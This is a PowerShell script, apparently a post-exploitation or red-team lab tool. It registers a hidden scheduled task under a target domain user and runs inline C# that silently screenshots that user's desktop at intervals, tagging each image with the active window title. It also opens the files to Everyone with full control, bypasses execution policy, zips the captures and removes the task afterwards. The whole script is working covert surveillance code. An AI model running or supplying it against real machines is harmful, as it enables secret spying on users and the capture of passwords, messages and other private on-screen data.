# schtask-screenshot.ps1
# Usage : .\schtask-screenshot.ps1 -TargetUser "CDG37.LOC\mlmanceau" [-OutputDir "C:\Temp"] [-Duration 120] [-Interval 5]
 
param(
    [Parameter(Mandatory)][string]$TargetUser,
    [string]$OutputDir = "C:\Lab",
    [string]$TaskName = "MaTaskScreenshot",
    [int]$Duration = 120,
    [int]$Interval = 5
)
 
$base = "$OutputDir\screenshot"
 
Write-Host "[*] Creating working directory and setting ACL..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
New-Item -ItemType Directory -Path $base -Force | Out-Null
icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
icacls $base /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
 
Write-Host "[*] Cleaning up previous files..." -ForegroundColor Cyan
Remove-Item -Path "$base\*.png","$OutputDir\screenshot-type.cs","$OutputDir\screenshot.ps1","$OutputDir\screenshot-error.log","$base\screenshot-log.txt","$OutputDir\screenshots-*.zip" -Force -ErrorAction SilentlyContinue
 
Write-Host "[*] Creating C# type file..." -ForegroundColor Cyan
$csharp = @'
using System;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Runtime.InteropServices;
 
public class ScreenCapture {
 
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
 
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
 
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
 
    static string GetActiveWindowTitle() {
        System.Text.StringBuilder sb = new System.Text.StringBuilder(256);
        GetWindowText(GetForegroundWindow(), sb, 256);
        return sb.ToString();
    }
 
    public static void Run(string outputDir, int durationSeconds, int intervalSeconds) {
        SetProcessDPIAware();
        DateTime endTime = DateTime.Now.AddSeconds(durationSeconds);
        int count = 0;
        string logPath = Path.Combine(outputDir, "screenshot-log.txt");
 
        File.AppendAllText(logPath,
            "[Screenshot started at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "]\r\n");
 
        while (DateTime.Now < endTime) {
            try {
                string windowTitle = GetActiveWindowTitle();
                string timestamp   = DateTime.Now.ToString("yyyyMMdd-HHmmss");
                string filename    = Path.Combine(outputDir, "screen-" + timestamp + "-" + count + ".png");
 
                Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb)) {
                    using (Graphics g = Graphics.FromImage(bmp)) {
                        g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
                    }
 
                    using (Graphics g = Graphics.FromImage(bmp)) {
                        string label = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + windowTitle;
                        Font font    = new Font("Consolas", 12, FontStyle.Bold);
                        SizeF size   = g.MeasureString(label, font);
                        g.FillRectangle(new SolidBrush(Color.FromArgb(180, 0, 0, 0)), 5, 5, size.Width + 4, size.Height + 4);
                        g.DrawString(label, font, Brushes.LimeGreen, 7, 7);
                    }
 
                    bmp.Save(filename, ImageFormat.Png);
                }
 
                File.AppendAllText(logPath,
                    "[" + DateTime.Now.ToString("HH:mm:ss") + "] Captured : " + filename + " [" + windowTitle + "]\r\n");
 
                count++;
            } catch (Exception ex) {
                File.AppendAllText(logPath, "[ERROR] " + ex.Message + "\r\n");
            }
 
            Thread.Sleep(intervalSeconds * 1000);
        }
 
        File.AppendAllText(logPath,
            "[Screenshot stopped at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] Total : " + count + " screenshots\r\n");
    }
}
'@
Set-Content -Path "$OutputDir\screenshot-type.cs" -Value $csharp -Encoding ASCII
icacls "$OutputDir\screenshot-type.cs" /grant "*S-1-1-0:(F)" | Out-Null
 
Write-Host "[*] Creating PS1 payload script..." -ForegroundColor Cyan
$ps1 = @"
`$cs = Get-Content "$OutputDir\screenshot-type.cs" -Raw
Add-Type -TypeDefinition `$cs -ReferencedAssemblies System.Drawing,System.Windows.Forms 2>&1 | Out-File "$OutputDir\screenshot-error.log"
[ScreenCapture]::Run("$base", $Duration, $Interval)
"@
Set-Content -Path "$OutputDir\screenshot.ps1" -Value $ps1 -Encoding ASCII
icacls "$OutputDir\screenshot.ps1" /grant "*S-1-1-0:(F)" | Out-Null
 
Write-Host "[*] Creating and starting scheduled task as $TargetUser (hidden)..." -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $OutputDir\screenshot.ps1" -WorkingDirectory $OutputDir
$principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
$settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes ($Duration / 60 + 5))
Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName
 
Write-Host "[*] Screenshot recorder running for ${Duration}s (interval: ${Interval}s) in context of $TargetUser (hidden)..." -ForegroundColor Cyan
Write-Host "[*] Output directory : $base" -ForegroundColor Cyan
 
$elapsed = 0
$totalWait = $Duration + 15
while ($elapsed -lt $totalWait) {
    Start-Sleep -Seconds 5
    $elapsed += 5
    $result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
    if ($result -ne 267009) { break }
    $count = (Get-ChildItem "$base\*.png" -ErrorAction SilentlyContinue | Measure-Object).Count
    Write-Host "[*] Still running... ($elapsed / ${totalWait}s) - $count screenshot(s) captured so far" -ForegroundColor Cyan
}
 
$result      = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
$screenshots = Get-ChildItem "$base\*.png" -ErrorAction SilentlyContinue
if ($result -eq 0 -and $screenshots.Count -gt 0) {
    Write-Host "[+] $($screenshots.Count) screenshot(s) captured, creating ZIP..." -ForegroundColor Green
    $zipPath = "$OutputDir\screenshots-$(Get-Date -Format 'yyyyMMdd-HHmmss').zip"
    Compress-Archive -Path "$base\*.png" -DestinationPath $zipPath -Force
    Write-Host "[+] ZIP created : $zipPath" -ForegroundColor Green
    Write-Host "[+] Log :" -ForegroundColor Green
    Get-Content "$base\screenshot-log.txt" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ -ForegroundColor White }
} else {
    Write-Host "[-] Failed or no screenshots captured (LastTaskResult: $result)" -ForegroundColor Red
    Get-Content "$OutputDir\screenshot-error.log" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
    Get-Content "$base\screenshot-log.txt" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ -ForegroundColor Yellow }
}
 
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan